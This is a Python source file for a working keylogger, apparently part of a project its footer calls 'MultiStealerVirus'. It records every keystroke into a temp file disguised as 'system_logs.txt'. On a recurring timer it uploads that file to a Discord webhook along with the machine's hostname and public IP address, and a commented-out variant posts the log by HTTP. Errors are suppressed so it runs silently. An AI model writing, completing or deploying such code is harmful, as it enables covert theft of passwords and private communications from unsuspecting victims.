from pynput import keyboard
from discord import SyncWebhook, File
import discord
import threading
import socket
import os
import requests
from config import INTERVAL, WEBHOOK_KEYLOGGER


class Keylogger:
    def __init__(self):
        self.keys = ""
        self.webhook_url = WEBHOOK_KEYLOGGER
        
    def send(self):
        try:
            try:
                webhook = SyncWebhook.from_url(self.webhook_url)
            except:
                return

            try:
                ip = requests.get("https://api.ipify.org").text
            except:
                ip = "Unknown"

            embed = discord.Embed(
                title = "Keylogger data",
                description = f"Keylogger data for: {socket.gethostname()}, {ip}",
                color = 0x10131c
            )

            embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
            try:
                webhook.send(embed=embed, file=File(f"{os.getenv('temp')}\system_logs.txt"))
            except:
                pass
        except:
            pass
        finally:
            try:
                timer = threading.Timer(INTERVAL, self.send)
                timer.start()
            except:
                pass
    
    #def send(self):
    #    try:
    #        with open(f"{os.getenv('temp')}\system_logs.txt", "r") as f:
    #            payload = json.dumps({"content": f.read()})
    #            requests.post(self.webhook_url, data=payload, headers={"Content-Type": "application/json"})
    #    except:
    #        pass
    #    finally:
    #        try:
    #            if self.running:
    #                timer = threading.Timer(INTERVAL, self.send)
    #                timer.start()
    #        except:
    #            pass

    def on_press(self, key):
        try:
            with open(f"{os.getenv('temp')}\system_logs.txt", "w", encoding="utf-8") as f:
                if key == keyboard.Key.enter:
                    self.keys += "\n"
                    f.write(self.keys)
                elif key == keyboard.Key.tab:
                    self.keys += "\t"
                    f.write(self.keys)
                elif key == keyboard.Key.space:
                    self.keys += " "
                    f.write(self.keys)
                elif key == keyboard.Key.shift:
                    self.keys += "'shift'"
                    f.write(self.keys)
                elif key == keyboard.Key.backspace:
                    self.keys += "'backspace'"
                    f.write(self.keys)
                elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    self.keys += "'ctrl'"
                    f.write(self.keys)
                elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                    self.keys += "'alt'"
                    f.write(self.keys)
                elif key == keyboard.Key.esc:
                    self.keys += "'esc'"
                    f.write(self.keys)
                elif key == keyboard.Key.caps_lock:
                    self.keys += "'caps_lock'"
                    f.write(self.keys)
                elif key == keyboard.Key.delete:
                    self.keys += "'del'"
                    f.write(self.keys)
                elif key == keyboard.Key.cmd:
                    self.keys += "'cmd'"
                    f.write(self.keys)
                else:
                    self.keys += str(key).strip("'")
                    f.write(self.keys)
        except:
            pass
    
    def run(self):
        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                self.send()
                listener.join()
        except:
            pass

#Logger = Keylogger("https://discord.com/api/webhooks/ID/TOKEN")
#Logger.run()
